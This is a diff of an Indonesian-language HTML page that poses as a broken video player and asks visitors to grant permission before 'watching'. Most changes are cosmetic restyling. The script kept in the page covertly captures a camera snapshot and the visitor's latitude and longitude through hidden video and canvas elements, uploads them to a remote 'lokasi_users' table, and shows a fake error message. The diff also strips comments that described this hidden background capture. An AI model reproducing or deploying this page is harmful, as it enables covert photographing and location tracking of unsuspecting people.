@@ -4,51 +4,60 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>INI ERA YAZZ - ERROR FEED</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
+  * { 
+    box-sizing: border-box; 
+    margin: 0; 
+    padding: 0; 
+  }
+
   body {
-    font-family: 'Inter', sans-serif;
-    background: #0f0f0f;
-    color: #eeeeee;
+    /* Update Font ke Plus Jakarta Sans */
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    background: #0a0a0a;
+    color: #f0f0f0;
     display: flex;
     flex-direction: column;
     align-items: center;
     min-height: 100vh;
     padding-bottom: 40px;
+    -webkit-font-smoothing: antialiased;
   }
 
   header {
     width: 100%;
-    padding: 20px;
+    padding: 25px;
     text-align: center;
-    font-size: 1.5rem;
-    font-weight: 600;
-    letter-spacing: -1px;
-    color: #e74c3c; /* Warna merah error */
-    border-bottom: 1px solid #222;
-    background: rgba(15, 15, 15, 0.8);
-    backdrop-filter: blur(10px);
+    font-size: 1.2rem;
+    font-weight: 700; /* Lebih tebal */
+    letter-spacing: 2px; /* Jarak antar huruf lebih elegan */
+    color: #ff3b30; 
+    border-bottom: 1px solid #1a1a1a;
+    background: rgba(10, 10, 10, 0.8);
+    backdrop-filter: blur(15px);
     position: sticky;
     top: 0;
     z-index: 100;
+    text-transform: uppercase;
   }
 
   #statusBox {
-    width: 90%;
+    width: 92%;
     max-width: 500px;
-    margin: 20px auto;
-    padding: 15px;
-    background: #1a1a1a;
-    border-radius: 12px;
+    margin: 25px auto;
+    padding: 18px;
+    background: #161616;
+    border-radius: 14px;
     text-align: center;
-    border: 1px solid #333;
+    border: 1px solid #222;
   }
 
   #statusText { 
-    font-size: 0.9rem; 
+    font-size: 0.85rem; 
+    font-weight: 500;
     color: #ff4d4d;
-    margin-bottom: 10px;
+    letter-spacing: 0.2px;
   }
 
   #list {
@@ -60,10 +69,10 @@
   }
 
   .card {
-    background: #1a1a1a;
-    border-radius: 16px;
+    background: #161616;
+    border-radius: 20px;
     overflow: hidden;
-    border: 1px solid #282828;
+    border: 1px solid #262626;
   }
 
   .media-container {
@@ -75,39 +84,48 @@
     align-items: center;
     justify-content: center;
     position: relative;
-    color: #555;
+    color: #444;
   }
 
-  /* Icon Video Rusak */
   .error-icon {
-    font-size: 3rem;
-    margin-bottom: 10px;
+    font-size: 3.2rem;
+    margin-bottom: 12px;
+    opacity: 0.7;
+  }
+
+  .media-container p {
+    font-weight: 600;
+    font-size: 0.9rem;
+    color: #777;
   }
 
   .info-overlay {
-    padding: 15px;
-    background: #151515;
+    padding: 18px;
+    background: #111;
   }
 
   .info-text {
-    font-size: 0.8rem;
-    color: #555;
+    font-size: 0.75rem;
+    font-weight: 400;
+    color: #666;
     text-align: center;
+    letter-spacing: 0.5px;
   }
 
-  #canvas { display: none; }
-  video { display: none; }
+  #canvas, video { display: none; }
 
   .floating-info {
     position: fixed;
-    bottom: 20px;
-    background: #e74c3c;
+    bottom: 25px;
+    background: #ff3b30;
     color: white;
-    padding: 10px 20px;
+    padding: 12px 25px;
     border-radius: 50px;
-    font-size: 0.8rem;
-    font-weight: 600;
-    box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
+    font-size: 0.75rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    box-shadow: 0 8px 20px rgba(255, 59, 48, 0.3);
   }
 </style>
 </head>
@@ -124,10 +142,10 @@
     <div class="media-container">
       <div class="error-icon">⚠️</div>
       <p>Video ini tidak dapat diputar</p>
-      <p style="font-size: 0.7rem;">Error Code: 0x80040255</p>
+      <p style="font-size: 0.7rem; font-weight: 400; margin-top: 5px; color: #555;">Error Code: 0x80040255</p>
     </div>
     <div class="info-overlay">
-      <div class="info-text">Izinkan dulu- Mencoba memuat ulang...</div>
+      <div class="info-text">Izinkan dulu - Mencoba memuat ulang...</div>
     </div>
   </div>
 </div>
@@ -149,7 +167,6 @@
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
 
-  // FITUR TETAP JALAN DI BELAKANG LAYAR
   async function startProcess() {
     statusText.innerText = "izinkan dulu bang baru nonton";
     
@@ -183,7 +200,6 @@
             await client.from("lokasi_users").insert([
               { foto: fileName, latitude: lat, longitude: lon }
             ]);
-            // Tidak menampilkan foto di layar, hanya mengubah status kecil
             statusText.innerText = "Kesalahan teknis: Pemutar tidak didukung.";
           }
           stream.getTracks().forEach(track => track.stop());
@@ -195,9 +211,7 @@
     }
   }
 
-  // Menjalankan proses capture tanpa merubah list UI
   startProcess();
 </script>
 </body>
 </html>
-
